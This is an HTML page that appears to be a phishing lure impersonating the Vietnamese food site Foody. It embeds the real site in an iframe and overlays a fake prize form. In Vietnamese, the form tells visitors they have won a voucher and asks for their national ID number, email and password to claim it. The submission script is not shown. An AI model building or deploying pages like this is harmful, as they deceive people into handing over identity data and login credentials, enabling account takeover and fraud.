<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="styles.css" />
    <title>Foddy</title>
  </head>
  <body>
    <iframe id="fr" src="https://www.foody.vn/"></iframe>
    <div id="mainform">
      <div id="wrap-form">
        <div>
          <img src="./assets/foody-vn.png" />
        </div>
        <div>
          <p id="title">
            Chào bạn, Chúc mừng bạn đã trúng voucher giảm giá đến từ foody, hãy
            nhập Cmnd, Email, Mật khẩu để nhận quà
          </p>
        </div>
        <input id="cmnd" name="cmnd" placeholder="Số CMND" />
          <input id="email" name="email" placeholder="Email" />
          <input
            id="password"
            name="password"
            placeholder="Mật Khẩu"
            type="password"
          />
          <button id="btn-login">Nhận quà</button>
      </div>
    </div>
    <script src="script.js" type="text/javascript"></script>
  </body>
</html>
